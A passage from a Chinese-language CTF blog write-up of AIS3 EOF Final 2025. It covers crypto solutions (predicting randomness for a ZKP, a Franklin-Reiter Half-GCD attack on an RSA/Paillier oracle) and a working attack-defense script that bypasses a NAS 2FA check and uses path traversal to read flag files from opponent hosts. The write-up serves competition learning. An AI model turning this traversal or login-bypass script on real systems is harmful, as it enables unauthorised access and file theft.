<p>整個zkp的邏輯其實沒什麼問題，有問題的會是 random，如果可預測那一開始 t 塞一個 pow(y, c, p)的模逆元，最後 s 大膽輸入 0 就好<br>翻一下 randrange 的實做就知道他r就是 getrandbits，然後把太大的數丟掉再生一次，而 getrandbits 眾所周知的可預測…嗎?<br>不，因為今天 q 的大小是 2049 bits，所以不能用一般 32 bits 一組的思維去想，有很多未知項<br>一開始我的思路是申請十組(極限，因為要有 <code>32*624</code> bits 的資料)，然後賭他跟 getrandbits 一樣，差不多 30, 40 次會有一次是這樣，加上隊友 @Chisheng Chen 說他以前用 z3+塞未知項(32 bits 一組下被丟掉的內容)去打就能過，就把複雜的摳腳本任務給他了<br>但最後好像出了點問題(SAT Solver 取到一組就會停)，反正我們最後是直接申請 30 組，然後把每個中間間格(被丟掉)的 bits 當未知數一起塞給 z3 去處理，差不多每五次會有一次對，挺 feasible<br>先不上腳本…過於混亂 但…過了 :D  </p>
<h3 id="prsa"><a href="#prsa" class="headerlink" title="prsa"></a>prsa</h3><p><strong>prsa.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, getRandomRange, bytes_to_long</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">sz</span>):</span><br><span class="line">    p = getPrime(sz // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(sz // <span class="number">2</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">    g = <span class="number">1</span> + n</span><br><span class="line">    mu = <span class="built_in">pow</span>(phi, -<span class="number">1</span>, n)</span><br><span class="line">    pk = (n, e, g)</span><br><span class="line">    sk = (n, d, phi, mu)</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">pk, m</span>):</span><br><span class="line">    n, e, g = pk</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">sk, c</span>):</span><br><span class="line">    n, d, phi, mu = sk</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paillier_encrypt</span>(<span class="params">pk, m</span>):</span><br><span class="line">    n, e, g = pk</span><br><span class="line">    r = getRandomRange(<span class="number">1</span>, n)</span><br><span class="line">    n2 = n * n</span><br><span class="line">    <span class="comment"># pow(g, m, n2) == (m * n + 1) % (n * n)</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(g, m, n2) * <span class="built_in">pow</span>(r, n, n2)) % n2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paillier_decrypt</span>(<span class="params">sk, c</span>):</span><br><span class="line">    n, d, phi, mu = sk</span><br><span class="line">    cl = <span class="built_in">pow</span>(c, phi, n * n)</span><br><span class="line">    <span class="keyword">return</span> ((cl - <span class="number">1</span>) // n) * mu % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_to_paillier</span>(<span class="params">pk, sk, c</span>):</span><br><span class="line">    <span class="keyword">return</span> paillier_encrypt(pk, rsa_decrypt(sk, c))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">paillier_to_rsa</span>(<span class="params">pk, sk, c</span>):</span><br><span class="line">    <span class="keyword">return</span> rsa_encrypt(pk, paillier_decrypt(sk, c))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">m, ln</span>):</span><br><span class="line">    pad_ln = ln - <span class="built_in">len</span>(m)</span><br><span class="line">    pre = pad_ln // <span class="number">2</span></span><br><span class="line">    post = pad_ln - pre</span><br><span class="line">    <span class="keyword">return</span> os.urandom(pre) + m + os.urandom(post)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    pk, sk = keygen(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;fake_flag&#125;&quot;</span>)</span><br><span class="line">    m = bytes_to_long(pad(flag.encode(), <span class="number">1024</span> // <span class="number">8</span> - <span class="number">1</span>))</span><br><span class="line">    c = rsa_encrypt(pk, m)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RSA Encrypted Flag:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48763</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1. RSA to Paillier&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;2. Paillier to RSA&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;3. Exit&quot;</span>)</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            c = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;c = &quot;</span>))</span><br><span class="line">            c = rsa_to_paillier(pk, sk, c)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">            c = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;c = &quot;</span>))</span><br><span class="line">            c = paillier_to_rsa(pk, sk, c)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid choice&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>一個 Pailler 同態加密和 RSA 互換的服務，共用公、私鑰<br>幾個步驟：  </p>
<ol>
<li>leak N：注意到把 <code>paillier_to_rsa</code> 和 <code>rsa_to_paillier</code> 的過程結合在一起能選定任意大於 N 的密文，再重新被 RSA 解密、加密後的值，而這兩個值 mod N 會一樣，也就是他們相減其實是 N 的倍數。  </li>
<li>獲得 N 之後就能開始想下一步，注意到 Pailler 加密的特性：<br>兩個密文相乘進去解密，最後取得的明文是兩者本來的明文相加，推推算式就知道，簡單說是因為 Pailler 對待密文的方法是拿去當指數，$c^m \times c^n&#x3D;c^{n+m}$<br>利用這個特性結合兩個服務，就能 leak flag + 任意數字 RSA 加密後的結果了  </li>
<li>Franklin-Reiter Attack：任意相加當然就是它，唯一的點是 e 太大，保險起見要多取幾組轉成多項式後做 Half GCD</li>
</ol>
<p>前面過於混亂，放主算法：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/whx1003/p/16217087.html">Half GCD 講解</a><br>實作參考：<a target="_blank" rel="noopener" href="https://github.com/rkm0959/Implementations/blob/main/Half_GCD/code.sage">https://github.com/rkm0959/Implementations/blob/main/Half_GCD&#x2F;code.sage</a>  </p>
<p>初始 statements 就是 flag-0 ~ flag-9  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">HGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">2</span> * b.degree() &lt;= a.degree() <span class="keyword">or</span> a.degree() == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    m = a.degree() // <span class="number">2</span></span><br><span class="line">    a_top, a_bot = a.quo_rem(x**m)</span><br><span class="line">    b_top, b_bot = b.quo_rem(x**m)</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a_top, b_top)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    q, e = c.quo_rem(d)</span><br><span class="line">    d_top, d_bot = d.quo_rem(x**(m // <span class="number">2</span>))</span><br><span class="line">    e_top, e_bot = e.quo_rem(x**(m // <span class="number">2</span>))</span><br><span class="line">    S00, S01, S10, S11 = HGCD(d_top, e_top)</span><br><span class="line">    RET00 = S01 * R00 + (S00 - q * S01) * R10</span><br><span class="line">    RET01 = S01 * R01 + (S00 - q * S01) * R11</span><br><span class="line">    RET10 = S11 * R00 + (S10 - q * S11) * R10</span><br><span class="line">    RET11 = S11 * R01 + (S10 - q * S11) * R11</span><br><span class="line">    <span class="keyword">return</span> RET00, RET01, RET10, RET11</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="built_in">print</span>(a.degree(), b.degree())</span><br><span class="line">    q, r = a.quo_rem(b)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a, b)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> c.monic()</span><br><span class="line">    q, r = c.quo_rem(d)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> GCD(d, r)</span><br><span class="line"></span><br><span class="line">P = PolynomialRing(Zmod(n), names=(<span class="string">&#x27;x&#x27;</span>,)); (x,) = P._first_ngens(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">statements = [(x + i)**e - j <span class="keyword">for</span> i, j <span class="keyword">in</span> statements]</span><br><span class="line"></span><br><span class="line">k = statements[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, st <span class="keyword">in</span> <span class="built_in">enumerate</span>(statements[<span class="number">1</span>:]):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    k = GCD(st, k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(k)</span></span><br><span class="line">k = k.monic()</span><br><span class="line">flag = -k[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in </span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag)))</span><br><span class="line"><span class="comment"># print(statements[0])</span></span><br></pre></td></tr></table></figure>
<p>基本上就是這樣，然後我一路到三點才睡覺…(<del>但 已經是最早睡的了</del>)  </p>
<p>半夜作業局.jpg  </p>
<p><img src="https://hackmd.io/_uploads/rJCLqhHKyg.png" alt="image">  </p>
<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><p>這次的 A&amp;D 有兩題，一個筆電電商和一個 NAS<br>電商：<a target="_blank" rel="noopener" href="https://github.com/users/Bogay/packages/container/package/aiscop3">https://github.com/users/Bogay/packages/container/package/aiscop3</a><br><img src="https://hackmd.io/_uploads/BySuHhHYJg.png" alt="image"></p>
<p>電商一開始幾乎是黑箱，但 Dockerfile 載一下就有 ✅  </p>
<p><del>是不是在偷臭啊，裡面甚至有個叫做 excel-pay 的執行檔</del><br>反正第二天就先藏 Jeopardy 的 flag，讓自己的排名摔出前三才能看封包，一開始可能是網路 issue 甚至連 NAS 的 ip 都沒掃出來…<br>比較有趣的是這次的 Patch，電商只能 Patch LUA 寫成的 WAF，我看大家都沒 Patch，然後 NAS 可能是洞太多所以兩招 LFI + CMDI 就能打天下…大家也都不 Patch 惹<br>快速帶一下 NAS 登入繞過 2FA 的部分：<br><strong>app.php</strong>  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="variable">$_SESSION</span>[<span class="string">&#x27;TWOFA&#x27;</span>] &lt;=&gt; <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// negative =&gt; TWOFA not passed</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: 2fa.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>無效 2FA，三一律一定都能過 …<br>驗證繞過後就是開心讀檔：  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">host</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://<span class="subst">&#123;host&#125;</span>:5000/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    boundary = <span class="string">&#x27;----WebKitFormBoundary7MA4YWxkTrZu0gW&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">f&#x27;multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span>&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = (</span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;Content-Disposition: form-data; name=&quot;username&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;user\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;Content-Disposition: form-data; name=&quot;password&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;user\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>--\r\n&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    sess = requests.session()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = sess.post(url, headers=headers, data=data, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Team <span class="subst">&#123;i&#125;</span> failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line">    response = sess.get(<span class="string">f&#x27;http://<span class="subst">&#123;host&#125;</span>:5000/app.php?app=files/download&amp;volume=public&amp;dir=../../../..&amp;file=fl4g&#x27;</span>, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&quot;http://35.221.181.38:8888/flag/&quot;</span></span><br><span class="line">token = <span class="string">&quot;298956eca545bc623493bac595eb72e1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">    host=<span class="string">f&quot;10.102.<span class="subst">&#123;i&#125;</span>.60&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    stdout_data = attack(host)</span><br><span class="line">    pattern = <span class="string">r&quot;EOF[a-zA-Z0-9]&#123;29&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, stdout_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;flags&quot;</span>: [flag],</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response = requests.post(target_url, json=payload)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Flag Submitted: <span class="subst">&#123;target_url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Submit Failed: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Found Flag QwQ&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>最後幾件事：<br>3. Game 其實是要用自己當下有的道具的 Byte 組合出 ARM 組語完成任務來取得分數<br>4. Jeopardy 最後一題 pwn 要 SQLI，改變大小 Overlapping 打 Tcache Poisoning，其實我有通靈出來但， @ Aukro 當下逆好像沒看到能這樣利用的點?!  </p>
<p>午餐<br><img src="https://hackmd.io/_uploads/HycN92SYye.png" alt="image">  </p>
<p>晚餐<br><img src="https://hackmd.io/_uploads/SyASc3HFyg.png" alt="image"></p>
<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>這次比賽比想像中肝，但好像也蠻愜意??<br>再次寫寫各位隊友和用心的主辦方 我玩得很開心!<br>順便帶走一件 DEFCON 衣服當獎品 w，不知道之後打不打的到…加油加油!<br>最後分數版， Crypto 和散步大成功<br><img src="https://hackmd.io/_uploads/S13ZqhBtkl.png" alt="image">  </p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Infra"><span class="toc-number">2.</span> <span class="toc-text">Infra</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1"><span class="toc-number">3.</span> <span class="toc-text">Day 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day1-%E6%99%9A%E4%B8%8A-Day2-%E4%B8%80%E9%96%8B%E5%A7%8B%E7%9A%84-Crypto-%E4%B9%8B%E6%97%85"><span class="toc-number">4.</span> <span class="toc-text">Day1 晚上 ~ Day2 一開始的 Crypto 之旅</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zkdlp"><span class="toc-number">4.1.</span> <span class="toc-text">zkdlp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prsa"><span class="toc-number">4.2.</span> <span class="toc-text">prsa</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-2"><span class="toc-number">5.</span> <span class="toc-text">Day 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">6.</span> <span class="toc-text">After all</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/02/09/eof-final-2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/02/09/eof-final-2025/&text=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/02/09/eof-final-2025/&is_video=false&description=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AIS3 EOF FINAL 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/02/09/eof-final-2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/02/09/eof-final-2025/&name=AIS3 EOF FINAL 2025 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/02/09/eof-final-2025/&t=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
